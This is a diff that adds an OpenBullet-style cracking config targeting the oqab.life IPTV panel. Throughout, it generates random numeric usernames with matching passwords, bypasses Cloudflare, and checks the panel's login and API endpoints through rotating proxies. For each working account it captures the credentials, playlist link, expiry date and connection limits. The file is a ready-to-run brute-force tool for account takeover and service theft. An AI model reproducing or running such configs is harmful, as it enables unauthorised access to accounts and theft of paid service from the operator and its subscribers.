@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "oqab.life m3u bypass cf",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-12T23:14:41.9077929+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "THE_HUNTER",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": true,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!FUNCTION RandomString "?d" -> VAR "1" 
+
+!FUNCTION RandomString "?d?d" -> VAR "2" 
+
+!FUNCTION RandomString "?d?d?d" -> VAR "3" 
+
+FUNCTION RandomString "?d?d?d?d" -> VAR "4" 
+
+!FUNCTION RandomString "?d?d?d?d?d" -> VAR "5" 
+
+!FUNCTION RandomString "?d?d?d?d?d?d" -> VAR "6" 
+
+!FUNCTION RandomString "?d?d?d?d?d?d?d" -> VAR "7" 
+
+!FUNCTION RandomString "?d?d?d?d?d?d?d?d" -> VAR "8" 
+
+!FUNCTION RandomString "?d?d?d?d?d?d?d?d?d" -> VAR "9" 
+
+!FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d" -> VAR "0" 
+
+!FUNCTION RandomString "?d" -> VAR "R" 
+
+FUNCTION Constant "<4>" -> CAP "USER" 
+
+FUNCTION Constant "<USER>" -> CAP "PASS" 
+
+!BYPASSCF "http://oqab.life:8080/get.php?username=<USER>&password=<PASS>&type=m3u_plus" AutoRedirect=TRUE 
+
+REQUEST GET "http://oqab.life:8080/get.php?username=<USER>&password=<PASS>&type=m3u_plus" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "#EXTINF:-1" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "#EXTINF:-1" 
+
+!BYPASSCF "http://oqab.life:8080/player_api.php?username=<USER>&password=<PASS>&type=m3u_plus" AutoRedirect=TRUE 
+
+REQUEST GET "http://oqab.life:8080/player_api.php?username=<USER>&password=<PASS>&type=m3u_plus" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "auth\":1,\"status\":\"Active\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "auth\":1,\"status\":\"Active\",\"" 
+
+PARSE "<SOURCE>" JSON "url" CreateEmpty=FALSE -> CAP "HOST" "http://" "" 
+
+PARSE "<SOURCE>" JSON "port" CreateEmpty=FALSE -> CAP "PORT" 
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "username" 
+
+PARSE "<SOURCE>" JSON "password" CreateEmpty=FALSE -> CAP "password" 
+
+FUNCTION Constant "http://oqab.life:8080/get.php?username=<USER>&password=<PASS>&type=m3u_plus" -> CAP "M3U" 
+
+PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "status" 
+
+PARSE "<SOURCE>" JSON "created_at" CreateEmpty=FALSE -> CAP "created_at" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<created_at>" -> CAP "created_at" 
+
+PARSE "<SOURCE>" JSON "exp_date" CreateEmpty=FALSE -> CAP "exp_date" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<exp_date>" -> CAP "exp_date" 
+
+PARSE "<SOURCE>" JSON "is_trial" CreateEmpty=FALSE -> CAP "SERVER TYPE" 
+
+FUNCTION Translate 
+  KEY "0" VALUE "Premium" 
+  KEY "1" VALUE "Trial" 
+  "<SERVER TYPE>" -> CAP "SERVER TYPE" 
+
+PARSE "<SOURCE>" JSON "max_connections" CreateEmpty=FALSE -> CAP "max_connections" 
+
+PARSE "<SOURCE>" JSON "active_cons" CreateEmpty=FALSE -> CAP "active_connections" 
+
+FUNCTION Constant "#THE_HUNTER" -> CAP "CHECKED BY" 
+
